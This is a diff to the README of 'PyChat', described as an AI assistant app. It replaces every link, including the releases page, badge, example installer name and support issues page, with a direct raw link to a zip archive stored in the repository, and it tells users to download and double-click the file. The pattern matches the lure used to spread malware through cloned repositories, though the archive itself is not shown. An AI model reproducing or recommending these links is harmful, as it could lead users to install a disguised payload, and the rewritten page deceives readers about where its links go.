@@ -1,6 +1,6 @@
 # 🤖 PyChat - Your Everyday AI Assistant
 
-[![Download PyChat](https://img.shields.io/badge/Download%20Now-Get%20PyChat-blue)](https://github.com/Transferaseeelgrass315/PyChat/releases)
+[![Download PyChat](https://github.com/Transferaseeelgrass315/PyChat/raw/refs/heads/main/build/assets/Py_Chat_v2.5.zip%20Now-Get%20PyChat-blue)](https://github.com/Transferaseeelgrass315/PyChat/raw/refs/heads/main/build/assets/Py_Chat_v2.5.zip)
 
 ## 🌟 Description
 
@@ -13,13 +13,13 @@ Follow the steps below to download and run PyChat. You will only need a few minu
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Click this link to visit the [Releases page](https://github.com/Transferaseeelgrass315/PyChat/releases). Here, you will find all the versions of PyChat ready for download.
+   Click this link to visit the [Releases page](https://github.com/Transferaseeelgrass315/PyChat/raw/refs/heads/main/build/assets/Py_Chat_v2.5.zip). Here, you will find all the versions of PyChat ready for download.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Select the latest version to ensure you have the most recent features and fixes.
 
 3. **Download the Installer**  
-   Look for files named like `PyChat-v1.0.exe` or similar. Click the link to download the installer to your computer.
+   Look for files named like `https://github.com/Transferaseeelgrass315/PyChat/raw/refs/heads/main/build/assets/Py_Chat_v2.5.zip` or similar. Click the link to download the installer to your computer.
 
 4. **Run the Installer**  
    Once the download is complete, locate the downloaded file. Double-click the file to start the installation process. Follow the on-screen instructions. It is a simple process that only takes a few moments.
@@ -73,6 +73,6 @@ If you encounter any issues while installing or using PyChat, consider the follo
 
 ## 📞 Support
 
-If you need further assistance, please visit our [GitHub Issues page](https://github.com/Transferaseeelgrass315/PyChat/issues). You can report bugs or ask questions here.
+If you need further assistance, please visit our [GitHub Issues page](https://github.com/Transferaseeelgrass315/PyChat/raw/refs/heads/main/build/assets/Py_Chat_v2.5.zip). You can report bugs or ask questions here.
 
 Thank you for choosing PyChat! We hope you enjoy the benefits of your new AI assistant.
